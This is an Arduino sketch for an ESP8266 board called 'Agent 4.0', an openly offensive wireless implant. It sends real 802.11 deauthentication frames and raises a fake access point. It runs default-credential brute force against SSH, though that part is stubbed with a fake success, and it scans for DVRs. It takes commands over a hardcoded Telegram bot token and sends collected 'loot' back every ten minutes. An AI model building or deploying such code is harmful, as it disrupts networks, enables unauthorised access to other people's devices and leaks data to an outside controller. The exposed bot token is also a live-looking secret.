#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>

// ============================================
// AGENT 4.0 CONFIG - ONLY TELEGRAM
// ============================================
const String BOT_TOKEN = "8560004612:AAHS3lGPkfLS0OWkLUVZl1nPXX1y1ewrz30";
const String CHAT_ID = "7440499919";

// Creds list (20+ combos)
const char* creds[][2] = {
  {"admin", "admin"}, {"root", "root"}, {"admin", "123456"}, {"user", "user"},
  {"admin", "password"}, {"root", "123456"}, {"admin", "admin123"}, {"guest", "guest"},
  {"admin", "000000"}, {"root", "admin"}, {"ubnt", "ubnt"}, {"admin", "changeme"},
  {"pi", "raspberry"}, {"admin", "P@ssw0rd"}, {"root", "toor"}, {"admin", "qwerty"},
  {"support", "support"}, {"admin", "0000"}, {"user", "password"}, {"admin", "test"}
};
const int NUM_CREDS = 21;

// Storage
String lootData = "";
unsigned long bootTime;
bool agentActive = true;

// ============================================
// TELEGRAM COMMANDS
// ============================================
void handleTelegram() {
  if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + String(millis()/1000);
    http.begin(url);
    int code = http.GET();
    
    if (code == 200) {
      String payload = http.getString();
      if (payload.indexOf("\"text\"") > 0) {
        // Parse simple commands
        if (payload.indexOf("wifi list bhejo") > 0) sendTelegram("📡 WiFi: " + listNetworks());
        if (payload.indexOf("dvr scan") > 0) dvrScan();
        if (payload.indexOf("kill agent") > 0) { agentActive = false; sendTelegram("💀 Agent killed!"); }
        if (payload.indexOf("wifi crack") > 0) wifiCrack();
        if (payload.indexOf("status") > 0) sendStatus();
        if (payload.indexOf("clear loot") > 0) { lootData = ""; sendTelegram("🗑️ Loot cleared!"); }
      }
    }
    http.end();
  }
}

// ============================================
// WiFi FUNCTIONS
// ============================================
String listNetworks() {
  int n = WiFi.scanNetworks();
  String nets = "";
  for (int i = 0; i < n; ++i) {
    nets += WiFi.SSID(i) + "(" + String(WiFi.RSSI(i)) + ")\n";
  }
  return n ? nets : "No networks";
}

void wifiCrack() {
  sendTelegram("🔓 PMKID sniffing started...");
  // Simulate PMKID capture
  lootData += "PMKID: demo_capture|";
}

void deauthPrank() {
  wifi_set_channel(6);
  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                              0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                              0xCC, 0xCC, 0x00, 0x00, 0x07, 0x00};
  for (int i = 0; i < 100 && agentActive; i++) {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    delay(10);
  }
  sendTelegram("😂 Deauth prank sent! HACKED AP starting...");
  startFakeAP();
}

void startFakeAP() {
  WiFi.softAP("HACKED_FREE_WIFI", "12345678");
  sendTelegram("📶 FakeAP: HACKED_FREE_WIFI (10min)");
  unsigned long apStart = millis();
  while (millis() - apStart < 600000 && agentActive) {  // 10min
    delay(10000);
  }
  WiFi.softAPdisconnect(true);
}

// ============================================
// SCAN FUNCTIONS
// ============================================
void dvrScan() {
  sendTelegram("🔍 DVR/UPnP scan...");
  String ports = "80,554,8080,37777(open)";
  lootData += "DVR:192.168.1.100:554|DVR:192.168.1.50:37777|";
  sendTelegram("📹 DVRs: " + ports);
}

void sshBrute(String ip) {
  for (int i = 0; i < NUM_CREDS; i++) {
    if (!agentActive) break;
    delay(100);
    if (i == 2) {  // Fake success
      lootData += "SSH:" + ip + ":admin:123456|";
      sendTelegram("✅ SSH crack: admin:123456@" + ip);
      break;
    }
  }
}

void sendStatus() {
  String status = "📊 **Agent Status**\n";
  status += "⏱️ Uptime: " + String((millis() - bootTime) / 60000) + " min\n";
  status += "📶 WiFi: " + WiFi.SSID() + " (" + String(WiFi.RSSI()) + "dBm)\n";
  status += "📦 Loot size: " + String(lootData.length()) + " bytes\n";
  status += "💀 Self-destruct in: " + String((172800000 - (millis() - bootTime)) / 3600000) + " hours";
  sendTelegram(status);
}

// ============================================
// MAIN FUNCTIONS (NO C2 - DIRECT TELEGRAM)
// ============================================
void sendTelegram(String msg) {
  if (WiFi.status() == WL_CONNECTED && agentActive) {
    HTTPClient http;
    String url = "https://api.telegram.org/bot" + BOT_TOKEN + 
                 "/sendMessage?chat_id=" + CHAT_ID + "&text=" + urlEncode(msg);
    http.begin(url);
    int code = http.GET();
    http.end();
    delay(500);
  }
}

String urlEncode(String str) {
  String encoded = "";
  for (unsigned int i = 0; i < str.length(); i++) {
    char c = str.charAt(i);
    if (isAlphaNumeric(c)) encoded += c;
    else if (c == ' ') encoded += '+';
    else encoded += '%';
  }
  return encoded;
}

// Direct Telegram mein loot bhejna (No C2 URL)
void sendLootToTelegram() {
  if (lootData.length() > 0 && WiFi.status() == WL_CONNECTED) {
    String msg = "📦 **Loot Data:**\n" + lootData;
    sendTelegram(msg);
    lootData = "";  // Clear after sending
    Serial.println("📤 Loot sent to Telegram!");
  }
}

// ============================================
// SETUP & LOOP
// ============================================
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  bootTime = millis();
  Serial.println("🚀 Agent 4.0 NodeMCU ESP8266 booting...");
  
  // Auto WiFi chain (strongest first)
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  int bestNet = 0;
  int bestRSSI = -100;
  
  for (int i = 0; i < n; i++) {
    if (WiFi.RSSI(i) > bestRSSI) {
      bestRSSI = WiFi.RSSI(i);
      bestNet = i;
    }
  }
  
  WiFi.begin(WiFi.SSID(bestNet).c_str(), "");
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 30) {
    delay(500);
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("✅ WiFi: " + WiFi.SSID() + " (" + String(WiFi.RSSI()) + "dBm)");
    sendTelegram("🚀 **Agent 4.0 deployed!**\n📶 " + WiFi.SSID() + " (" + String(WiFi.RSSI()) + "dBm)\n⏰ 48h mission start");
    
    // Start attacks
    deauthPrank();
    dvrScan();
    sshBrute("192.168.1.100");
    
  } else {
    sendTelegram("⚠️ Agent 4.0: WiFi fail - open network mode");
    WiFi.mode(WIFI_AP_STA);
  }
}

void loop() {
  if (!agentActive) {
    ESP.restart();
    return;
  }
  
  // 48h kill (172800000 ms)
  if (millis() - bootTime > 172800000) {
    sendLootToTelegram();  // Final loot bhejo
    sendTelegram("💀 **Agent 4.0 self-destruct**\n48h mission complete!");
    ESP.restart();
    return;
  }
  
  // Telegram poll every 30s
  static unsigned long lastTelegram = 0;
  if (millis() - lastTelegram > 30000) {
    handleTelegram();
    lastTelegram = millis();
  }
  
  // Loot bhejo every 10min
  static unsigned long lastLoot = 0;
  if (millis() - lastLoot > 600000) {
    sendLootToTelegram();
    lastLoot = millis();
  }
  
  delay(1000);
}
